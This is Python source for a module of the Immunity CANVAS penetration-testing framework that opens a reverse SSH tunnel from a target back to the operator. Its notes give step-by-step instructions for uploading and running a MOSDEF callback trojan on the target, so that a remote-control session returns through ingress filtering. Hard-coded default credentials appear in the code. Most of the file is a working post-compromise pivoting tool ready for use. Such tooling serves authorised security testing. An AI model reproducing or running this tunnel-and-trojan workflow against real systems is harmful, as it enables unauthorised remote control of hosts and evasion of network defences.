#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import os
import getopt
import sys
import socket
import time
import struct
import threading
import select

if '.' not in sys.path: sys.path.append('.')
from exploitutils import *
from tcpexploit import tcpexploit

NAME='SSH Reverse Tunnel'
DESCRIPTION='Create a reverse SSH tunnel between you and the target'
##Based off of rforward.py from paramiko/demos

DOCUMENTATION={}
DOCUMENTATION['References']=''
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION["Notes"]="""
This just sets up a reverse SSH tunnel between you and the target (equivilent of `ssh -R`). This is useful in situations where there are layers of NAT etc between you and the target and you want to establish a mosdef session for further escalation via a clientside etc

Run this module then over SSH run the relevant modef_callback_* trojan and point it
at the localhost + port you specify the mosdef traffic will then be reverse tunneled back to the listener that is set up automagically.

Host        - Current target - box you have SSH gredentials on
Port        - TCP port that SSH is listening on on that host
User        - Username that has SSH credentials
Password    - Password of that use
Port from   - The port to listen on on the target that will be bound to localhost
              127.0.0.1:<port> can be considered the 'start' of the tunnel.
IP to       - The IP to forward to from this end of the tunnel.
Port to     - The port to forward to from this end of the tunnel.
              <ip to>:<port to> can be considered the end of the tunnel.

The most common usage scenario will take the following form:

1. Set up a MOSDEF listener on localhost (127.0.0.1) on a free port (e.g. 5555)
2. Set the reverse SSH tunnel to a publicly addressable server 
   (e.g. target=1.2.3.4 port=22)
3. Set credentials username/pw
4. Set the port to forward from (e.g. 9999) - this will listen on 127.0.0.1:port
   on the target
5. Set the host & port to forward to, which will eb the MOSDEF listener you set up
   earlier (e.g. 127.0.0.1 5555) NOTE: this is the localhost of your this box NOT 
   the target
6. Click OK and if all is correct the reverse tunnel will be established
7. Now from a SSH login, upload & run run a mosdef callback trojan:
   `mosdef_callback_xx_yy 127.0.0.1 9999` 
   (located in <CANVAS_DIR>/backdoors/mosdef_callbacks)
   
   This will connect the MOSDEF trojan to the start of the reverse SSH tunnel on
   the target, the tunnel will then send the traffic back to this box running CANVAS,
   it will then be forwarded to the host/port specified (i.e. 127.0.0.1:5555) which
   will connect it to a MOSDEF listener. 
   
8. You have now tunnelled the MOSDEF back through any ingress filtering and you will 
   see a node pop up in CANVAS which is usable in the same way as any other node.
   

"""
DOCUMENTATION["Commandline"]="exploits/ssh_reverse_tunnel/ssh_reverse_tunnel.py -t 10.10.10.207 -O pf:5555 -O ip_to:10.10.10.10 -O pt:6666 -O user:user_name -O password:pass_word"

VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Tools'
PROPERTY['SITE']='Remote'
#PROPERTY['ARCH']=[['Windows']]
#PROPERTY['VERSION']=['NT','2000','XP','2003']

NOTES=""" 
"""

CHANGELOG="""
"""
##SSH libs
import libs.paramiko as paramiko

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.name          = NAME
        
        ##SSH credentials
        self.user          = 'root'
        self.password      = 'immunity'
        self.key_file      = None
        
        ##Port sshd is listening on
        self.port          = 22
        ##IP from - Will only succeed if the server's GatewayPorts option is enabled
        self.ip_from       = '127.0.0.1'
        ##Port for the remote side of the tunnel
        self.port_from     = 5555
        ##Port for the local side of the tunnel where the mosdef listener is
        self.port_to       = 5556
        
        ##IP on which to listen on the far side 
        self.ip_to         = "127.0.0.1"
         
        return

    def getArgs(self):
        
        self.host           = self.target.interface
        self.getarg('port')
        self.getarg('user')
        self.getarg('password')
        ##Cannot do until we have a 3des in non gpl python
        #self.getarg('key_file')
        #if len(self.key_file)==0:
        #    self.key_file   = None
        self.getarg('ip_from')
        self.getarg('ip_to')
        self.port_from      = int(self.argsDict.get("pf", self.port_from))
        self.port_to        = int(self.argsDict.get("pt", self.port_to))
        
        #print "Args set as:",self.host,self.port, self.user,self.key_file,self.ip_from,self.port_from,self.ip_to,self.port_to
        
    
    def handler(self, chan):
        """
        This is ran per connection that is made through the tunnel
        ATM - we are very much single threaded - fine tbh
        """
        sock = self.gettcpsock()
        try:
            sock.connect((self.ip_to, self.port_to))
        except Exception, e:
            chan.close()
            self.log('Forwarding request to %s:%d failed: %r' % (self.ip_to, self.port_to, e))
            return
        
        self.log('Connected!  Tunnel open %r -> %r -> %r' \
                 % (chan.origin_addr, chan.getpeername(),\
                   (self.ip_to, self.port_to)))
        self.setInfo("%s: tunnel passing traffic %s:%s:%s"%(NAME, self.port_from, self.ip_to, self.port_to))
        self.setProgress(100)
        
        while self.state != self.HALT:
            r, w, x = select.select([sock, chan], [], [], 2.0)
            if sock in r:
                data = sock.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                sock.send(data)
        
        chan.close()
        sock.close()
        self.log('Tunnel closed from %r' % (chan.origin_addr,))  

    def reverse_forward_tunnel(self, transport):
        """
        Do the call to paramiko to set up the tunnel in it's own thread
        server_port, remote_host, remote_port, transport
        Spawns a new thread for each connection to the tunnel
        """
        transport.request_port_forward(self.ip_from, self.port_from)
        while self.state != self.HALT:
            self.setInfo("%s: tunnel waiting for traffic %s:%s:%s"%(NAME, self.port_from, self.ip_to, self.port_to))
            self.setProgress(50)
            chan = transport.accept(1000)
            if chan is None:
                continue
            self.handler(chan)
            #thr = threading.Thread(target=self.handler, args=(chan,))
            #thr.setDaemon(True)
            #thr.start()
        self.log("Reverse SSH Tunnel Loop halting")

    def test(self):
        return 0

    def run(self):
        
        self.getArgs()
        
        #TODO check if there is a listener on the port - if not set one up
        # perhaps auto upload & execute mosddef ?
        self.log('%s running against %s:%d '\
                 %(NAME,self.host,self.port))
        self.setInfo('%s setting up %s:%d  - running'\
                 %(NAME,self.host,self.port))
        self.log("%s Setting up Reverse SSH tunnel for target '%s' %d:%s:%d for user:%s"%(NAME, self.host, self.port_from, self.ip_to, self.port_to, self.user) )
        
            
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.WarningPolicy())
        
        try:
            client.connect(self.host, self.port, username=self.user, password=self.password, key_filename=self.key_file, look_for_keys=False)
        except Exception, e:
            self.log("%s: Failed to set up tunnel: %s"%(NAME, e))
            self.setInfo("%s: Failed to set up tunnel: %s"%(NAME, e))
            return 0
    
        self.log('Now forwarding remote port %d to %s:%d ...' % (self.port_from, self.ip_to, self.port_to))
    
        try:
            self.reverse_forward_tunnel(client.get_transport())
        except paramiko.SSHException, err:
            self.log("Problem setting up the reverse SSH tunnel: '%s'"%(err))
            self.setInfo("%s Failed to set up tunnel: %s"%(NAME, err))
            return 0
        
        self.setInfo("%s: Tunnel closed down"%(NAME))
        return 1


    def usage(self):
        print 'Usage: %s -t host -p port  [-O pf:5556 -O ip_to:10.10.10.10 -O pt:5555 -O user:user_name -O password:pass_word"'%(sys.argv[0])
        

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
